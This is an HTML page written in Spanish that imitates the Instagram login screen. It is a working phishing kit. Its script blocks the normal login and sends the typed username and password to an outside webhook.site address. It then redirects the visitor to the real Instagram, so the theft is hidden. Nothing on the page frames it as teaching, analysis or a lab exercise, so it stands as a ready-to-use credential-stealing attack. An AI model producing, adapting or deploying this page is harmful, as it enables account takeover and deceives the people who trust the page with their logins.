<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Inicia sesión en Instagram</title>
    <style>
        body { background-color: #fafafa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; border: 1px solid #dbdbdb; padding: 20px 40px; width: 100%; max-width: 350px; text-align: center; box-sizing: border-box; }
        .logo { width: 175px; margin: 22px auto 12px; }
        input { width: 100%; padding: 9px; margin-bottom: 6px; border: 1px solid #dbdbdb; border-radius: 3px; box-sizing: border-box; background: #fafafa; font-size: 12px; }
        button { width: 100%; padding: 7px; background-color: #0095f6; color: white; border: none; border-radius: 4px; font-weight: 600; margin-top: 8px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="card">
        <img class="logo" src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram">
        <form id="loginForm">
            <input type="text" name="usuario" placeholder="Teléfono, usuario o correo" required>
            <input type="password" name="password" placeholder="Contraseña" required>
            <button type="submit">Iniciar sesión</button>
        </form>
    </div>

    <script>
        document.getElementById('loginForm').onsubmit = function(e) {
            e.preventDefault();
            var formData = new FormData(this);
            fetch('https://webhook.site/ead7c29b-87ec-48f2-94a1-976c087aec41', {
                method: 'POST',
                body: formData
            });
            setTimeout(function() {
                window.location.href = "https://www.instagram.com";
            }, 300);
        };
    </script>
</body>
</html>
